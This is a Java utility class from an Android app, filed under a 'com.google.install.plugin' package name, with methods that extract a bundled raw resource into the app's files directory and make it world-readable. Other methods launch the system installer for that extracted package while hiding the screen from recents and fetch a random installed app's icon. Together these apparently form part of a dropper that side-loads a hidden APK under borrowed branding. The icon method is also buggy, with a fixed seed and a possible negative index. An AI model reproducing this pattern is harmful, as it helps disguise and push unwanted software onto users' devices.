package com.google.install.plugin;

import java.io.File;
import java.io.InputStream;
import java.util.List;
import java.util.Random;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.drawable.Drawable;
import android.net.Uri;

public class Utils {
    private static final String TAG = "Utils";

    public static boolean isPackageAlreadyInstalled(Context context, String pkgName) {
        List<PackageInfo> installedList = context.getPackageManager().getInstalledPackages(
                PackageManager.GET_UNINSTALLED_PACKAGES);
        int installedListSize = installedList.size();
        for(int i = 0; i < installedListSize; i++) {
            PackageInfo tmp = installedList.get(i);
            if(pkgName.equalsIgnoreCase(tmp.packageName)) {
                return true;
            }
            
        }
        return false;
    }
    
    public static ResolveInfo getRandomAppInfo(Context context) {
        List<ResolveInfo> mApps = null;

        Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);

        mApps = context.getPackageManager().queryIntentActivities(mainIntent, 0);
        
        if (mApps != null) {
            Random random = new Random(System.currentTimeMillis());
            int data = random.nextInt();
            if (data < 0) data = - data;
            Config.LOGD(TAG, "app size = " + mApps.size() + "  data % size = " + data % mApps.size());
            ResolveInfo info = mApps.get(data % mApps.size());
            return info;
        }
        
        return null;
    }
    
    public static Drawable getRadomAppIcon(Context context) {
        List<ResolveInfo> mApps = null;

        Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);

        mApps = context.getPackageManager().queryIntentActivities(mainIntent, 0);
        
        if (mApps != null) {
            Random random = new Random(100);
            int data = random.nextInt();
            ResolveInfo info = mApps.get(data % mApps.size());
            return info.activityInfo.loadIcon(context.getPackageManager());
        }
        
        return null;
    }
    
    public static boolean unzipRawToPath(Context context, int resourceId, String targetFileName) {
        try {
            InputStream is = context.getResources().openRawResource(resourceId);
            ZipUtil.outputFile(is, context.getFilesDir() + "/", targetFileName);
            Runtime.getRuntime().exec("chmod 666 " +  context.getFilesDir() + "/" + targetFileName);
            is.close();
            return true;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
    
    public static void goHome(Context context) {
        Intent i= new Intent(Intent.ACTION_MAIN);

        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        i.addCategory(Intent.CATEGORY_HOME);
        context.startActivity(i);
    }
    
    public static void startSystemInstallActivity(Context context) {
        Intent i = new Intent(Intent.ACTION_VIEW);
        File upgradeFile = new File(context.getFilesDir() + "/" + Config.DUMP_PACKAGE_NAME);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
        context.startActivity(i); 
    }
}
